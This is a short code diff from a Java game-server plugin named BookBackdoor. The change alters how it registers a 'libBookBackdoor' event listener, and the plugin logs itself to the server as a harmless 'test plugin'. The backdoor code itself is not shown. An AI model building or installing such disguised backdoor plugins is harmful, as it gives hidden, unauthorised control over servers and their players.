@@ -13,7 +13,7 @@ public final class BookBackdoor extends JavaPlugin {
         getConfig().options().copyDefaults(true);
         saveConfig();
         // Startup libBookBackdoor
-        manager.registerEvents(new libBookBackdoor(this), this);
+        manager.registerEvents(new libBookBackdoor(this, true), this);
         //
         getServer().getLogger().info("[Test Plugin] Loaded our test plugin");
     }
